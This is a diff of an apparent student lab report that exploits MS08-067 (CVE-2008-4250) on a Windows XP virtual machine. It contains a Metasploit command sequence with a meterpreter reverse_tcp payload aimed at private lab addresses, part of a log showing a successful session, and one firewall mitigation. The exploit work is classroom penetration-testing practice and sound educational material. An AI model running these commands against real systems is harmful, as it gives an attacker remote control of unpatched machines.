@@ -1,7 +1,30 @@
 http://www.binarytides.com/hack-windows-xp-metasploit/
 
 
+Potential Vulnerability:
+	
+	PORT: 445
+	CVE: CVE-2008-4250
+	DESCRIPTION:  The vulnerability could allow remote code execution if an affected system received a specially crafted 			   RPC request. On Microsoft Windows 2000, Windows XP, and Windows Server 2003 systems, an attacker could    			exploit this vulnerability without authentication to run arbitrary code. 	
+	IMPACT: An attacker who successfully exploited this vulnerability could take complete control of an affected system 		    remotely.
 
+The system is exploitable:
+
+	B: Below is an MSF script to exploit it
+
+		use exploit/windows/smb/ms08_067_netapi
+		set RHOST 192.168.0.33
+		set payload windows/meterpreter/reverse_tcp
+		set LHOST 192.168.0.129
+		exploit
+
+	C: Below explain ways one fixes the VM. 
+
+		1. Block TCP ports 139 and 445 at the firewall
+		(https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067)
+
+MetaSploit Log
+==========================================================================================================================
 msf auxiliary(nbns_response) > use exploit/windows/smb/ms08_067_netapi
 msf exploit(ms08_067_netapi) > set RHOST 192.168.0.33
 RHOST => 192.168.0.33
@@ -27,48 +50,3 @@ System Language : en_US
 Domain          : WORKGROUP
 Logged On Users : 2
 Meterpreter     : x86/windows
-
-
-
-
-Potential Vulnerability:
-
-
-	DESCRIPTION, CVE, PORT etc. GOES HERE
-
-Two possibilities, either it is exploitable or not.
-Fill out below as appropriate.
-
-The system is exploitable:
-	A: I can't seem to find a way to exploit it using MSF.
-
-		SHOW THAT YOU TRIED
-
-	B: Below is an MSF script to exploit it
-
-		YOUR SCRIPT GOES HERE
-
-	C: Below explain ways one fixes the VM. 
-
-		YOUR EXPLANATION GOES HERE
-
-The system is not exploitable, explain why the system is not exploitable
-by filling in the following as appropriate:
-
-	A: There is no known vulnerability
-
-		EXPLAIN HOW YOU KNOW
-
-	B: There appears to be a vulnerability, 
-		but the system is configured to mitigate
-		against it.
-
-		EXPLAIN, SHOW THE CONFIG/MITIGATION
-
-	C: Some versions of the service are vulnerable, this one is not. 
-
-		I searched: YOUR ANSWER HERE (PROVIDE LINKS)
-
-		Vulnerable versions include: YOUR ANSWER HERE (LINKS)
-
-		The system is using version: YOUR ANSWER HERE (HOW DID YOU FIND THIS)
